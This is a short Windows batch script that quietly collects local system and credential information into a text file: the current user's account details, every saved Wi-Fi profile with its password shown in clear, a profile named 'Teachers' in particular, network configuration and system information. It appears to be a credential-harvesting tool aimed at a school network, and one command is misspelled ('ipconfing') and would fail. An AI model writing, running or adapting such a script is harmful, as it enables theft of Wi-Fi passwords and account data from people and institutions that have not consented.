@echo off

echo. >> keycontent_output.txt
echo START---------------------------------------------------------------------------------->> keycontent_output.txt
echo AT: %time% - %date% >> keycontent_output.txt

echo Info for ^"%username%^": >> keycontent_output.txt
net user %username% >> keycontent_output.txt
echo. >> keycontent_output.txt

netsh wlan show profile * key=clear >> keycontent_output.txt
netsh wlan show profile Teachers key=clear >> keycontent_output.txt
echo. >> keycontent_output.txt
echo. >> keycontent_output.txt
ipconfing /all >> keycontent_output.txt
echo. >> keycontent_output.txt
echo. >> keycontent_output.txt
systeminfo >> keycontent_output.txt
echo END------------------------------------------------------------------------------------>> keycontent_output.txt
exit